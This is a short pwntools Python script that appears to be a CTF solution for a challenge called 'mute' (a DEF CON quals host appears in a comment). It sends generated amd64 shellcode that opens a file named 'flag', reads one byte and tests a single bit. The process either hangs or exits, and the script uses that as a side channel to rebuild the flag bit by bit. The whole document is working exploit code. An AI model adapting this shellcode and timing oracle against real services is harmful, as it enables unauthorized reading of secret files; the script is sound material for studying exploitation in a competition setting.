
from pwn import *
import sys
context.update(arch='amd64', os='linux', log_level='ERROR')


s = ""
for i in range(10):
    c = 0
    for j in range(8):
        r = process('mute')
        #r = remote("mute_9c1e11b344369be9b6ae0caeec20feb8.quals.shallweplayaga.me", 443)
        r.readline()

        src = pwnlib.shellcraft.amd64.linux.open("flag", 0)
        src += pwnlib.shellcraft.amd64.mov("r8", "rax")
        src += pwnlib.shellcraft.amd64.linux.lseek("r8", i, 0)
        src += pwnlib.shellcraft.amd64.linux.read("r8", "rsp", 1)
        src += """
            movzx	eax, BYTE PTR [rsp]
            movsx	edx, al
            mov	eax, %s
            mov	ecx, eax
            sar	edx, cl
            mov	eax, edx
            and	eax, 1
            test	eax, eax
            je	.L2
        .L3:
            jmp	.L3
        .L2:
            leave
            ret
        """ % j
        log.info(src)
        sc = asm(src)
        r.send(sc + "\0" * (0x1000 - len(sc)))
        try:
            r.recv(timeout=1)
            c = (c >> 1) | 128
        except EOFError:
            c = c >> 1
    sys.stdout.write(chr(c))
    sys.stdout.flush()